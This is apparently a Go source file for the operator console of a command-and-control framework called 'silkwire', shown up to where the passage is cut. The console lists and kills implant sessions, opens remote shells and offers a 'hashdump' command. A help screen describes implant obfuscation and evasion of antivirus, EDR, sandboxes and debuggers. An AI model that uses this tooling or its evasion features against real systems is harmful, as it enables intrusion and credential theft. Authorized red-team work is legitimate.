package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	pb "silkwire/proto"

	rfconsole "github.com/reeflective/console"
	"github.com/spf13/cobra"
	"github.com/stevedomin/termtable"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// Global variables for the console application
var (
	rootCmd        *cobra.Command
	replCmd        *cobra.Command
	sessionsCmd    *cobra.Command
	sessionCmd     *cobra.Command
	shellCmd       *cobra.Command
	killCmd        *cobra.Command
	exitCmd        *cobra.Command
	quitCmd        *cobra.Command
	listenerCmd    *cobra.Command
	listenerAddCmd *cobra.Command
	listenerLsCmd  *cobra.Command
	listenerRmCmd  *cobra.Command
	generateCmd    *cobra.Command
	regenerateCmd  *cobra.Command
	implantsCmd    *cobra.Command

	serverAddrFlag   string
	basicConsoleFlag bool

	ocGlobal         *OperatorConsole
	serverState      *C2Server
	consoleApp       *rfconsole.Console
	currentSessionID string
)

// getFileCompletions returns file and directory completions for the given prefix
func getFileCompletions(toComplete string) []string {
	var completions []string

	// If toComplete is empty, list files in current directory
	if toComplete == "" {
		toComplete = "."
	}

	// Handle directory vs file completion
	dir := filepath.Dir(toComplete)
	base := filepath.Base(toComplete)

	// If the path ends with a separator, we're completing within that directory
	if strings.HasSuffix(toComplete, string(filepath.Separator)) {
		dir = toComplete
		base = ""
	}

	// Read directory contents
	entries, err := os.ReadDir(dir)
	if err != nil {
		// If we can't read the directory, fall back to current directory
		if entries, err = os.ReadDir("."); err != nil {
			return completions
		}
		dir = "."
	}

	// Filter entries that match the base prefix
	for _, entry := range entries {
		name := entry.Name()

		// Skip hidden files unless explicitly requested
		if strings.HasPrefix(name, ".") && !strings.HasPrefix(base, ".") {
			continue
		}

		// Check if the file name matches the prefix
		if base == "" || strings.HasPrefix(name, base) {
			fullPath := filepath.Join(dir, name)

			// For directories, add a trailing separator
			if entry.IsDir() {
				fullPath += string(filepath.Separator)
			}

			// Clean up the path for better display
			if dir == "." && !strings.HasPrefix(toComplete, "./") {
				fullPath = name
				if entry.IsDir() {
					fullPath += string(filepath.Separator)
				}
			}

			completions = append(completions, fullPath)
		}
	}

	return completions
}

// getEth0IP returns the IPv4 address of the eth0 interface, or empty string if not found
func getEth0IP() string {
	iface, err := net.InterfaceByName("eth0")
	if err != nil {
		return ""
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return ""
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// mustInitConsole initializes the console and server connection
func mustInitConsole(cmd *cobra.Command, args []string) {
	if serverState == nil {
		serverState = NewC2Server()
	}
	if ocGlobal == nil {
		c, err := NewOperatorConsole(serverAddrFlag, serverState)
		if err != nil {
			log.Printf("Warning: Could not connect to server %s: %v", serverAddrFlag, err)
			fmt.Println("Running in offline mode - some features may not work")
		}
		ocGlobal = c
	}
}

// Run starts the main console loop
func (oc *OperatorConsole) Run() {
	oc.showWelcomeBanner()

	// Initialize known sessions on startup (populate without notifications)
	oc.initializeKnownSessions()

	// Auto-refresh sessions periodically
	if oc.autoRefresh {
		go oc.autoRefreshSessions()
	}

	// Set up signal handling for the interactive loop
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	defer signal.Stop(sigChan)

	// Use a simple buffered reader for robust input across environments
	reader := bufio.NewReader(os.Stdin)

	for {
		// Check for signals non-blocking
		select {
		case sig := <-sigChan:
			fmt.Printf("\n\nReceived %v, exiting console...\n", sig)
			return
		default:
		}

		// Drain any pending notifications above the prompt line
		oc.notifMux.Lock()
		if len(oc.pendingNotifications) > 0 {
			for _, n := range oc.pendingNotifications {
				fmt.Printf("%s\n", n)
			}
			oc.pendingNotifications = nil
		}
		oc.notifMux.Unlock()

		// Prompt and read input
		prompt := oc.getPrompt()
		fmt.Print(prompt)
		input, err := reader.ReadString('\n')
		if err != nil {
			if isCtrlC(err) {
				continue
			}
			fmt.Printf("Error reading input: %v\n", err)
			return
		}

		// Process input
		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		oc.processInput(input)
	}
}

// processInput processes user input from the main console
func (oc *OperatorConsole) processInput(input string) {
	oc.AddToHistory(input)

	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	command := strings.ToLower(parts[0])
	args := parts[1:]

	switch command {
	case "help", "h", "?":
		showMainHelp()

	case "sessions", "s":
		oc.showSessions()

	case "refresh", "r":
		fmt.Println("Refreshing sessions...")
		oc.showSessions()

	case "status":
		oc.showStatus()

	case "history":
		oc.showHistory()

	case "auto-refresh":
		oc.toggleAutoRefresh()

	case "notifications":
		if len(args) > 0 {
			switch args[0] {
			case "check":
				oc.showPendingNotifications()
			case "clear":
				oc.clearPendingNotifications()
			default:
				fmt.Println("Usage: notifications check|clear")
				fmt.Println("   Session events appear above the prompt automatically")
			}
		} else {
			fmt.Println("Usage: notifications check|clear")
			fmt.Println("   Session events appear above the prompt automatically")
		}

	case "clear":
		fmt.Print("\033[2J\033[H")
		showWelcomeMessage()

	case "use":
		if len(args) == 0 {
			fmt.Println("Usage: use <session_id>")
			fmt.Println("   Example: use cd334a25")
			return
		}
		oc.executeShellCommand(args[0])

	case "shell", "sh":
		if len(args) == 0 {
			fmt.Println("Usage: shell <session_id>")
			fmt.Println("   Example: shell cd334a25")
			return
		}
		oc.executeShellCommand(args[0])

	case "ps", "pwd", "ls", "sysinfo", "info", "hashdump":
		if len(args) == 0 {
			fmt.Printf("Usage: %s <session_id>\n", command)
			fmt.Printf("   Example: %s cd334a25\n", command)
			return
		}
		oc.handleSessionCommand(args[0], command)

	case "session-rm", "session-del", "session-remove":
		if len(args) == 0 {
			fmt.Println("Usage: session-rm <session_id>")
			return
		}
		full := oc.findImplantID(args[0])
		if full == "" {
			fmt.Printf("Session not found: %s\n", args[0])
			return
		}
		oc.KillSession(full)
		// Also delete the session record if server supports it
		if oc.client != nil {
			if resp, err := oc.client.DeleteSession(context.Background(), &pb.SessionDeleteRequest{ImplantId: full}); err != nil {
				if st, ok := status.FromError(err); ok && st.Code() == codes.Unimplemented {
					fmt.Println("Session terminated. Server does not support purge via RPC; record may remain until cleanup.")
				} else {
					fmt.Printf("Failed to delete session record: %v\n", err)
				}
			} else if !resp.Success {
				fmt.Printf("Failed to delete session record: %s\n", resp.Message)
			} else {
				fmt.Println("Session record deleted")
			}
		}

	case "quit", "q", "exit":
		fmt.Println("Goodbye!")
		return

	case "listeners":
		oc.handleListenerCommand([]string{"ls"})

	case "generate":
		oc.handleGenerateCommand(args)

	case "obfuscation":
		if len(args) > 0 && args[0] == "info" {
			oc.showObfuscationInfo()
		} else {
			fmt.Printf("%s Usage: %s\n", colorize("[*]", colorBlue), colorize("obfuscation info", colorGreen))
		}

	case "implants":
		oc.showImplants()

	default:
		fmt.Printf("Unknown command: %s\n", command)
		fmt.Println("Type 'help' for available commands")
	}
}

// getPrompt returns the current prompt string
func (oc *OperatorConsole) getPrompt() string {
	return colorize("silkwire >> ", colorBrightRed)
}

// showWelcomeBanner displays the welcome banner with stats
func (oc *OperatorConsole) showWelcomeBanner() {
	printBannerWithStats(oc)
}

// Additional helper methods for the console
func (oc *OperatorConsole) showSessions() {
	sessions, err := oc.GetSessions()
	if err != nil {
		fmt.Printf("Failed to get sessions: %v\n", err)
		return
	}
	printSessionsTable(sessions)
}

func (oc *OperatorConsole) showImplants() {
	builds, err := oc.GetImplantBuilds()
	if err != nil {
		fmt.Printf("Failed to get implant builds: %v\n", err)
		return
	}

	if len(builds) == 0 {
		fmt.Println(colorize("No implants have been generated yet", colorYellow))
		return
	}

	// Create a new table
	t := termtable.NewTable(nil, &termtable.TableOptions{
		Padding:      2,
		UseSeparator: false,
	})

	// Set headers with colors
	t.SetHeader([]string{
		colorize("Codename", colorBlue),
		colorize("Filename", colorBlue),
		colorize("OS/Arch", colorBlue),
		colorize("Format", colorBlue),
		colorize("Size", colorBlue),
		colorize("Build Time", colorBlue),
		colorize("Obf", colorBlue),
		colorize("SHA256", colorBlue),
		colorize("Created", colorBlue),
	})

	// Add rows with build data
	for _, build := range builds {
		// Format file size
		var sizeStr string
		if build.FileSize < 1024*1024 {
			sizeStr = fmt.Sprintf("%.1f KB", float64(build.FileSize)/1024)
		} else {
			sizeStr = fmt.Sprintf("%.1f MB", float64(build.FileSize)/(1024*1024))
		}

		// Format build time
		buildTimeStr := fmt.Sprintf("%.2fs", float64(build.BuildTimeMs)/1000)

		// Format OS/Arch
		osArch := fmt.Sprintf("%s/%s", build.Os, build.Arch)

		// Format created time
		createdTime := time.Unix(build.CreatedAt, 0)
		createdStr := formatDuration(time.Since(createdTime)) + " ago"

		// Truncate filename if too long
		filename := build.Filename
		if len(filename) > 20 {
			filename = filename[:17] + "..."
		}

		// Truncate SHA256 to first 8 chars
		sha256Short := build.Sha256Hash
		if len(sha256Short) > 8 {
			sha256Short = sha256Short[:8]
		}

		// Color code based on debug flag
		codenameColor := colorGreen
		if build.Debug {
			codenameColor = colorYellow
		}

		// Add row
		t.AddRow([]string{
			colorize(build.Codename, codenameColor),
			filename,
			osArch,
			build.Format,
			sizeStr,
			buildTimeStr,
			fmt.Sprintf("%d", build.ObfuscationLevel),
			colorize(sha256Short, colorDarkGray),
			createdStr,
		})
	}

	// Print the table
	fmt.Printf("\n%s\n\n", colorize("Generated Implants", colorCyan))
	fmt.Println(t.Render())
	fmt.Printf("\n%s %d implants\n\n", colorize("Total:", colorBlue), len(builds))
}

func (oc *OperatorConsole) showStatus() {
	sessions, _ := oc.GetSessions()
	fmt.Printf("\n%s\n", colorize("Console Status", colorCyan))
	fmt.Println(strings.Repeat("─", 40))
	fmt.Printf("Active Sessions: %d\n", len(sessions))
	fmt.Printf("Server Address: %s\n", serverAddrFlag)
	fmt.Printf("Auto-refresh: %t\n", oc.autoRefresh)
	fmt.Printf("Notifications: %s\n", colorize("Always Enabled", colorGreen))
	fmt.Printf("Command History: %d entries\n", len(oc.commandHistory))
	fmt.Printf("Last Activity: %s ago\n", formatDuration(time.Since(oc.lastActivity)))
	fmt.Println()
}

func (oc *OperatorConsole) showHistory() {
	fmt.Printf("\n%s\n", colorize("Command History", colorCyan))
	fmt.Println(strings.Repeat("─", 40))
	if len(oc.commandHistory) == 0 {
		fmt.Println("No commands in history")
		return
	}

	start := 0
	if len(oc.commandHistory) > 20 {
		start = len(oc.commandHistory) - 20
	}

	for i := start; i < len(oc.commandHistory); i++ {
		fmt.Printf("%3d  %s\n", i+1, oc.commandHistory[i])
	}
	fmt.Println()
}

func (oc *OperatorConsole) toggleAutoRefresh() {
	oc.autoRefresh = !oc.autoRefresh
	status := "disabled"
	if oc.autoRefresh {
		status = "enabled"
		go oc.autoRefreshSessions()
	}
	fmt.Printf("Auto-refresh %s\n", status)
}

// Notifications are always enabled - no toggle needed

func (oc *OperatorConsole) showPendingNotifications() {
	oc.notifMux.Lock()
	defer oc.notifMux.Unlock()

	if len(oc.pendingNotifications) == 0 {
		fmt.Printf("No recent session events\n")
		return
	}

	fmt.Printf("\n%s\n", colorize("Recent Session Events", colorCyan))
	fmt.Println(strings.Repeat("─", 40))
	for i, n := range oc.pendingNotifications {
		fmt.Printf("%3d  %s\n", i+1, n)
	}
	fmt.Printf("\nThese appear above the prompt automatically\n")
}

func (oc *OperatorConsole) clearPendingNotifications() {
	fmt.Printf("Session events are logged directly by logrus\n")
	fmt.Printf("   Use 'clear' command to clear the terminal screen\n")
	fmt.Printf("   Or scroll up in your terminal to see previous session events\n")
}

// showObfuscationInfo displays comprehensive information about obfuscation capabilities
func (oc *OperatorConsole) showObfuscationInfo() {
	fmt.Printf("\n%s\n", colorize("Comprehensive Implant Obfuscation Information", colorCyan))
	fmt.Println(strings.Repeat("═", 60))

	fmt.Printf("\n%s\n", colorize("Available Obfuscation Levels:", colorYellow))
	fmt.Printf("  %s - %s\n", colorize("Level 0", colorGreen), "No obfuscation (development mode)")
	fmt.Printf("  %s - %s\n", colorize("Level 1", colorGreen), "Light obfuscation (string encryption, symbol stripping)")
	fmt.Printf("  %s - %s\n", colorize("Level 2", colorGreen), "Medium obfuscation (+ name obfuscation, anti-debugging)")
	fmt.Printf("  %s - %s\n", colorize("Level 3", colorGreen), "Heavy obfuscation (+ API hiding, sandbox evasion)")
	fmt.Printf("  %s - %s\n", colorize("Level 4", colorGreen), "Extreme obfuscation (+ runtime packing, advanced evasion)")

	fmt.Printf("\n%s\n", colorize("Obfuscation Techniques:", colorYellow))
	fmt.Printf("  %s - XOR-based string encryption with dynamic keys\n", colorize("String Obfuscation", colorGreen))
	fmt.Printf("  %s - Function and variable name hashing\n", colorize("Name Obfuscation", colorGreen))
	fmt.Printf("  %s - Junk code injection and control flow flattening\n", colorize("Control Flow", colorGreen))
	fmt.Printf("  %s - Dynamic API resolution and import hiding\n", colorize("API Obfuscation", colorGreen))
	fmt.Printf("  %s - Network traffic obfuscation and fingerprinting\n", colorize("Network Hiding", colorGreen))
	fmt.Printf("  %s - Runtime code encryption and memory protection\n", colorize("Runtime Packing", colorGreen))
	fmt.Printf("  %s - UPX compression with custom parameters\n", colorize("Binary Packing", colorGreen))
	fmt.Printf("  %s - Fake version info and resource injection\n", colorize("Resource Masking", colorGreen))

	fmt.Printf("\n%s\n", colorize("Advanced Evasion Techniques:", colorYellow))
	fmt.Printf("  %s - VM detection and anti-virtualization\n", colorize("Anti-VM", colorGreen))
	fmt.Printf("  %s - Debugger detection and anti-debugging\n", colorize("Anti-Debug", colorGreen))
	fmt.Printf("  %s - Advanced sandbox detection and evasion\n", colorize("Sandbox Evasion", colorGreen))
	fmt.Printf("  %s - EDR/AV process detection and avoidance\n", colorize("EDR Detection", colorGreen))
	fmt.Printf("  %s - Anti-emulation and behavior analysis evasion\n", colorize("Anti-Emulation", colorGreen))
	fmt.Printf("  %s - Process hollowing detection\n", colorize("Process Hollowing", colorGreen))
	fmt.Printf("  %s - Network fingerprinting evasion\n", colorize("Network Fingerprinting", colorGreen))

	fmt.Printf("\n%s\n", colorize("Generation Examples:", colorYellow))
	fmt.Printf("  %s\n", colorize("generate --https example.com:443 --obfuscation-level 2", colorMagenta))
	fmt.Printf("  %s\n", colorize("generate --mtls 192.168.1.100:8443 --obfuscation-level 3 --sandbox-evasion", colorMagenta))
	fmt.Printf("  %s\n", colorize("generate --http 10.0.0.1:80 --obfuscation-level 4 --runtime-packing --anti-emulation", colorMagenta))

	fmt.Printf("\n%s\n", colorize("Performance Impact:", colorYellow))
	fmt.Printf("  %s - %s\n", colorize("Level 1-2", colorGreen), "Minimal impact (~5-10% overhead)")
	fmt.Printf("  %s - %s\n", colorize("Level 3", colorYellow), "Moderate impact (~15-25% overhead)")
	fmt.Printf("  %s - %s\n", colorize("Level 4", colorRed), "Higher impact (~30-50% overhead)")

	fmt.Printf("\n%s\n", colorize("Build Process:", colorYellow))
	fmt.Printf("  1. %s\n", "Source code obfuscation (strings, names, control flow)")
	fmt.Printf("  2. %s\n", "Import path obfuscation and alias generation")
	fmt.Printf("  3. %s\n", "Multi-platform compilation with enhanced flags")
	fmt.Printf("  4. %s\n", "Binary post-processing (stripping, packing)")
	fmt.Printf("  5. %s\n", "Resource injection and metadata obfuscation")
	fmt.Printf("  6. %s\n", "Integrity verification and build reporting")

	fmt.Printf("\n%s\n", colorize("Security Notes:", colorRed))
	fmt.Printf("  • Higher obfuscation levels increase stealth but impact performance\n")
	fmt.Printf("  • Test thoroughly in target environments before deployment\n")
	fmt.Printf("  • Use responsibly and only for authorized penetration testing\n")
	fmt.Printf("  • Some techniques may trigger heuristic detection systems\n")

	fmt.Printf("\n%s\n", colorize("Build Tools Required:", colorYellow))
	fmt.Printf("  %s - Standard Go compiler (required)\n", colorize("go", colorGreen))
	fmt.Printf("  %s - Code obfuscation tool (optional, for garble support)\n", colorize("garble", colorYellow))
	fmt.Printf("  %s - Binary packing tool (optional, for compression)\n", colorize("upx", colorYellow))
	fmt.Printf("  %s - Resource editor (optional, for Windows resources)\n", colorize("rcedit", colorYellow))
	fmt.Printf("  %s - Python 3 interpreter (required for build scripts)\n", colorize("python3", colorGreen))

	fmt.Println()
}

// displayNotifications shows pending notifications above the prompt in reeflective console mode
func (oc *OperatorConsole) displayNotifications() {
	ticker := time.NewTicker(1 * time.Second) // Slower polling to avoid conflicts
	defer ticker.Stop()

	for range ticker.C {
		if oc == nil {
			return
		}

		// Check if console is closed
		oc.closeMux.Lock()
		if oc.closed {
			oc.closeMux.Unlock()
			return
		}
		oc.closeMux.Unlock()

		// Do not display notifications if in a session
		oc.inSessionMux.Lock()
		if oc.inSession {
			oc.inSessionMux.Unlock()
			continue
		}
		oc.inSessionMux.Unlock()

		oc.notifMux.Lock()
		if len(oc.pendingNotifications) > 0 {
			notifs := oc.pendingNotifications
			oc.pendingNotifications = nil
			oc.notifMux.Unlock()

			// Use consoleApp.TransientPrintf to ensure prompt is redrawn correctly
			if oc.consoleApp != nil {
				for _, notif := range notifs {
					oc.consoleApp.TransientPrintf("\r%s %s\n", colorize("[*]", colorBlue), notif)
				}
			} else {
				// Fallback for basic console mode
				for _, notif := range notifs {
					fmt.Fprintf(os.Stderr, "\r%s %s\n", colorize("[*]", colorBlue), notif)
				}
			}
		} else {
			oc.notifMux.Unlock()
		}
	}
}

func (oc *OperatorConsole) executeShellCommand(sessionID string) {
	session, err := oc.FindSessionByPartialID(sessionID)
	if err != nil {
		fmt.Printf("%v\n", err)
		return
	}

	fmt.Printf("Starting shell session with %s@%s...\n", session.Username, session.Codename)
	oc.startLocalPtyShell(session.ImplantID)
}

// initializeKnownSessions populates the known sessions on startup without notifications
func (oc *OperatorConsole) initializeKnownSessions() {
	sessions, err := oc.GetSessions()
	if err != nil {
		return
	}

	oc.notifMux.Lock()
	for _, session := range sessions {
		oc.knownSessions[session.ImplantID] = struct{}{}
		oc.knownSessionsInfo[session.ImplantID] = session
	}
	oc.notifMux.Unlock()
}

// autoRefreshSessions periodically refreshes the session list
func (oc *OperatorConsole) autoRefreshSessions() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !oc.autoRefresh {
			return
		}

		sessions, err := oc.GetSessions()
		if err != nil {
			continue
		}

		oc.notifMux.Lock()

		// Create a map of current sessions for easy lookup
		currentSessions := make(map[string]*Session)
		for _, session := range sessions {
			currentSessions[session.ImplantID] = session
		}

		// Check for new sessions
		for _, session := range sessions {
			if _, known := oc.knownSessions[session.ImplantID]; !known {
				oc.knownSessions[session.ImplantID] = struct{}{}
				oc.knownSessionsInfo[session.ImplantID] = session
			} else {
				// Update session info for existing sessions
				oc.knownSessionsInfo[session.ImplantID] = session
			}
		}

		// Check for lost sessions (sessions we knew about but are no longer in the current list)
		// Skip generating notifications if event stream is active (it will handle notifications)
		oc.eventStreamMux.Lock()
		hasEventStream := oc.eventStream != nil
		oc.eventStreamMux.Unlock()

		for sessionID, sessionInfo := range oc.knownSessionsInfo {
			if _, exists := currentSessions[sessionID]; !exists {
				// Session was lost
				delete(oc.knownSessions, sessionID)

				// Only generate notification if event stream is not active
				if !hasEventStream {
					notification := fmt.Sprintf(
						"Session %s lost (last seen %s ago)",
						colorize(sessionID[:8], colorRed),
						formatDuration(time.Since(sessionInfo.LastSeen)),
					)
					oc.pendingNotifications = append(oc.pendingNotifications, notification)
				}
				delete(oc.knownSessionsInfo, sessionID)
			}
		}

		oc.notifMux.Unlock()
	}
}

// isCtrlC checks if the error is due to Ctrl+C
func isCtrlC(err error) bool {
	return strings.Contains(err.Error(), "interrupted")
}

// RunWithConsole starts the console with an embedded server (for standalone mode)
func RunWithConsole() {
	// Start C2 server in background
	c2Server := NewC2Server()

	go func() {
		// Start gRPC server (same as in main server code)
		// ... server startup code ...
	}()

	// Wait a moment for server to start
	time.Sleep(time.Second)

	// Start operator console
	console, err := NewOperatorConsole("localhost:8443", c2Server)
	if err != nil {
		log.Fatalf("Failed to create console: %v", err)
	}
	defer console.Close()

	console.Run()
}

// getColoredHelpTemplate returns a colored help template for Cobra commands
func getColoredHelpTemplate() string {
	return colorize("{{.Name}}", colorRed) + colorize("{{if .Short}} - {{.Short}}{{end}}", colorYellow) + `
{{if .Long}}

` + colorize("DESCRIPTION:", colorCyan) + `
  {{.Long}}{{end}}

` + colorize("USAGE:", colorCyan) + `{{if .Runnable}}
  ` + colorize("{{.UseLine}}", colorMagenta) + `{{end}}{{if .HasAvailableSubCommands}}
  ` + colorize("{{.CommandPath}} [command]", colorMagenta) + `{{end}}

{{if gt (len .Aliases) 0}}` + colorize("ALIASES:", colorCyan) + `
  ` + colorize("{{.NameAndAliases}}", colorGreen) + `

{{end}}{{if .HasExample}}` + colorize("EXAMPLES:", colorCyan) + `
  ` + colorize("{{.Example}}", colorYellow) + `

{{end}}{{if .HasAvailableSubCommands}}` + colorize("AVAILABLE COMMANDS:", colorCyan) + `{{range .Commands}}{{if (or .IsAvailableCommand (eq .Name "help"))}}
  ` + colorize("{{rpad .Name .NamePadding }}", colorGreen) + ` ` + colorize("{{.Short}}", colorYellow) + `{{end}}{{end}}

{{end}}{{if .HasAvailableLocalFlags}}` + colorize("FLAGS:", colorCyan) + `
{{.LocalFlags.FlagUsages | trimTrailingWhitespaces}}

{{end}}{{if .HasAvailableInheritedFlags}}` + colorize("GLOBAL FLAGS:", colorCyan) + `
{{.InheritedFlags.FlagUsages | trimTrailingWhitespaces}}

{{end}}{{if .HasHelpSubCommands}}` + colorize("ADDITIONAL HELP TOPICS:", colorCyan) + `{{range .Commands}}{{if .IsAdditionalHelpTopicCommand}}
  ` + colorize("{{rpad .CommandPath .CommandPathPadding}}", colorGreen) + ` ` + colorize("{{.Short}}", colorYellow) + `{{end}}{{end}}

{{end}}{{if .HasAvailableSubCommands}}Use "` + colorize("{{.CommandPath}} [command] --help", colorYellow) + `" for more information about a command.

{{end}}`
}

// getColoredUsageTemplate returns a colored usage template for Cobra commands
func getColoredUsageTemplate() string {
	return colorize("USAGE:", colorCyan) + `{{if .Runnable}}
  ` + colorize("{{.UseLine}}", colorMagenta) + `{{end}}{{if .HasAvailableSubCommands}}
  ` + colorize("{{.CommandPath}} [command]", colorMagenta) + `{{end}}{{if gt (len .Aliases) 0}}

` + colorize("ALIASES:", colorCyan) + `
  ` + colorize("{{.NameAndAliases}}", colorGreen) + `{{end}}{{if .HasExample}}

` + colorize("EXAMPLES:", colorCyan) + `
  ` + colorize("{{.Example}}", colorYellow) + `{{end}}{{if .HasAvailableSubCommands}}

` + colorize("AVAILABLE COMMANDS:", colorCyan) + `{{range .Commands}}{{if (or .IsAvailableCommand (eq .Name "help"))}}
  ` + colorize("{{rpad .Name .NamePadding }}", colorGreen) + ` ` + colorize("{{.Short}}", colorYellow) + `{{end}}{{end}}{{end}}{{if .HasAvailableLocalFlags}}

` + colorize("FLAGS:", colorCyan) + `
{{.LocalFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}{{if .HasAvailableInheritedFlags}}

` + colorize("GLOBAL FLAGS:", colorCyan) + `
{{.InheritedFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}{{if .HasHelpSubCommands}}

` + colorize("ADDITIONAL HELP TOPICS:", colorCyan) + `{{range .Commands}}{{if .IsAdditionalHelpTopicCommand}}
  ` + colorize("{{rpad .CommandPath .CommandPathPadding}}", colorGreen) + ` ` + colorize("{{.Short}}", colorYellow) + `{{end}}{{end}}{{end}}{{if .HasAvailableSubCommands}}

Use "` + colorize("{{.CommandPath}} [command] --help", colorYellow) + `" for more information about a command.
{{end}}`
}

// Cobra command initialization
func initCobra() {
	rootCmd = &cobra.Command{
		Use:   "c2-console",
		Short: "Silkwire C2 Operator Console",
		Run: func(cmd *cobra.Command, args []string) {
			// Default to interactive console if no subcommand is provided
			mustInitConsole(cmd, args)
			if basicConsoleFlag {
				fmt.Println(colorize("Starting advanced console mode", colorGreen))
				ocGlobal.Run()
			} else {
				startReeflectiveConsole()
			}
		},
		PersistentPreRun: func(cmd *cobra.Command, args []string) {
			mustInitConsole(cmd, args)
		},
	}

	// Set custom colored help template
	rootCmd.SetHelpTemplate(getColoredHelpTemplate())
	rootCmd.SetUsageTemplate(getColoredUsageTemplate())
	rootCmd.PersistentFlags().StringVarP(&serverAddrFlag, "server", "s", "localhost:8443", "C2 server address")
	rootCmd.PersistentFlags().BoolVar(&basicConsoleFlag, "basic-console", false, "Use basic console mode with real-time notifications")

	// repl/interactive command
	replCmd = &cobra.Command{
		Use:   "repl",
		Short: "Start interactive console (REPL)",
		Run: func(cmd *cobra.Command, args []string) {
			if !basicConsoleFlag {
				fmt.Println(colorize("Starting advanced console mode", colorGreen))
			}
			startReeflectiveConsole()
		},
	}
	rootCmd.AddCommand(replCmd)

	// sessions
	sessionsCmd = &cobra.Command{
		Use:   "sessions",
		Short: "List active sessions",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.ListSessions()
		},
	}
	// sessions ls
	sessionsLsCmd := &cobra.Command{
		Use:   "ls",
		Short: "List active sessions",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.ListSessions()
		},
	}

	// sessions purge <id>
	sessionsPurgeCmd := &cobra.Command{
		Use:   "purge <implant_id>",
		Short: "Delete a session record without signaling the implant",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			full := ocGlobal.findImplantID(args[0])
			if full == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			if ocGlobal.client == nil {
				fmt.Println("Not connected to server")
				return
			}
			resp, err := ocGlobal.client.DeleteSession(context.Background(), &pb.SessionDeleteRequest{ImplantId: full})
			if err != nil {
				// Graceful handling for servers that don't support the RPC yet
				if st, ok := status.FromError(err); ok && st.Code() == codes.Unimplemented {
					fmt.Println("Server does not support 'DeleteSession' yet. Please update the server.")
				} else {
					fmt.Printf("%v\n", err)
				}
				return
			}
			if !resp.Success {
				fmt.Printf("%s\n", resp.Message)
				return
			}
			fmt.Println("Session record deleted")
		},
	}
	// sessions rm <id>
	sessionsRmCmd := &cobra.Command{
		Use:   "rm <implant_id>",
		Short: "Terminate a session and delete its record",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			full := ocGlobal.findImplantID(args[0])
			if full == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			// First terminate the session on the implant while stream is active
			ocGlobal.KillSession(full)
			// Then delete the session record if server supports it
			if ocGlobal.client != nil {
				if resp, err := ocGlobal.client.DeleteSession(context.Background(), &pb.SessionDeleteRequest{ImplantId: full}); err != nil {
					if st, ok := status.FromError(err); ok && st.Code() == codes.Unimplemented {
						fmt.Println("Server does not support purge via RPC; record may remain until cleanup.")
					} else {
						fmt.Printf("Failed to delete session record: %v\n", err)
					}
				} else if !resp.Success {
					fmt.Printf("Failed to delete session record: %s\n", resp.Message)
				} else {
					fmt.Println("Session record deleted")
				}
			}
			// Refresh list to reflect changes
			ocGlobal.ListSessions()
		},
	}
	// alias: sessions kill <id>
	sessionsKillCmd := &cobra.Command{
		Use:   "kill <implant_id>",
		Short: "Terminate a session and delete its record (alias)",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			full := ocGlobal.findImplantID(args[0])
			if full == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			ocGlobal.KillSession(full)
			if ocGlobal.client != nil {
				if resp, err := ocGlobal.client.DeleteSession(context.Background(), &pb.SessionDeleteRequest{ImplantId: full}); err != nil {
					if st, ok := status.FromError(err); ok && st.Code() == codes.Unimplemented {
						fmt.Println("Server does not support purge via RPC; record may remain until cleanup.")
					} else {
						fmt.Printf("Failed to delete session record: %v\n", err)
					}
				} else if !resp.Success {
					fmt.Printf("Failed to delete session record: %s\n", resp.Message)
				} else {
					fmt.Println("Session record deleted")
				}
			}
		},
	}
	// sessions clear
	sessionsClearCmd := &cobra.Command{
		Use:   "clear",
		Short: "Delete all session records without signaling implants",
		Run: func(cmd *cobra.Command, args []string) {
			if ocGlobal.client == nil {
				fmt.Println("Not connected to server")
				return
			}

			sessions, err := ocGlobal.GetSessions()
			if err != nil {
				fmt.Printf("Failed to get sessions: %v\n", err)
				return
			}

			if len(sessions) == 0 {
				fmt.Println("No active sessions to clear")
				return
			}

			fmt.Printf("Clearing %d session(s)...\n", len(sessions))

			cleared := 0
			failed := 0

			for _, session := range sessions {
				// Delete the session record without signaling the implant
				resp, err := ocGlobal.client.DeleteSession(context.Background(), &pb.SessionDeleteRequest{ImplantId: session.ImplantID})
				if err != nil {
					if st, ok := status.FromError(err); ok && st.Code() == codes.Unimplemented {
						fmt.Printf("Session %s: Server does not support DeleteSession yet. Please update the server.\n", session.ImplantID[:8])
						failed++
					} else {
						fmt.Printf("Session %s: Failed to delete record: %v\n", session.ImplantID[:8], err)
						failed++
					}
				} else if !resp.Success {
					fmt.Printf("Session %s: Failed to delete record: %s\n", session.ImplantID[:8], resp.Message)
					failed++
				} else {
					cleared++
				}
			}

			fmt.Printf("\nCleared %d session(s)", cleared)
			if failed > 0 {
				fmt.Printf(" (%d failed)", failed)
			}
			fmt.Println()
		},
	}
	sessionsCmd.AddCommand(sessionsLsCmd, sessionsRmCmd, sessionsKillCmd, sessionsPurgeCmd, sessionsClearCmd)
	rootCmd.AddCommand(sessionsCmd)

	// listeners (alias for `listener ls`)
	listenersCmd := &cobra.Command{
		Use:   "listeners",
		Short: "List active listeners",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.handleListenerCommand([]string{"ls"})
		},
	}
	rootCmd.AddCommand(listenersCmd)

	// implants command to list all generated implants
